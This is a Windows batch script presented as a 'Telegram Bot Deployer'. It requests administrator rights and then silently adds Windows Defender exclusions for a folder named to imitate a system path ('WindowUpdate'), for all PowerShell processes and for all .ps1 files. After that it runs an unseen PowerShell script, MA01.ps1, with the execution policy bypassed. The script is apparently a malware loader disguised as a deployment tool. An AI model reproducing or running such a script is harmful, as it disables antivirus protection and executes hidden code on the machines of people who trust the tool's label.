@echo off
title Telegram Bot Deployer
color 0A

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

setlocal enabledelayedexpansion
set "SCRIPT_DIR=%~dp0"

set "SELECTED=MA01.ps1"
set "LABEL=Maraki Lab 1"

echo ========================================
echo    TELEGRAM BOT DEPLOYER
echo ========================================
echo.

powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowUpdate' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction SilentlyContinue"

echo [INFO] Defender exclusions added.
echo.

set "FOUND_SCRIPT=%SCRIPT_DIR%%SELECTED%"

if not exist "%FOUND_SCRIPT%" (
    echo [ERROR] Script not found: %FOUND_SCRIPT%
    pause
    exit /b 1
)

echo [INFO] Selected: %LABEL% (%SELECTED%)
echo [INFO] Deploying...
echo.

powershell -NoProfile -ExecutionPolicy Bypass -File "%FOUND_SCRIPT%"

if %errorlevel% equ 0 (
    echo.
    echo ========================================
    powershell -Command "Write-Host '   DEPLOYMENT SUCCESSFUL!' -ForegroundColor Green"
    echo ========================================
    echo.
    echo [INFO] Deployed on host: %COMPUTERNAME%
    echo.
) else (
    echo.
    echo ========================================
    powershell -Command "Write-Host '   DEPLOYMENT FAILED!' -ForegroundColor Red"
    echo ========================================
)

exit /b 0
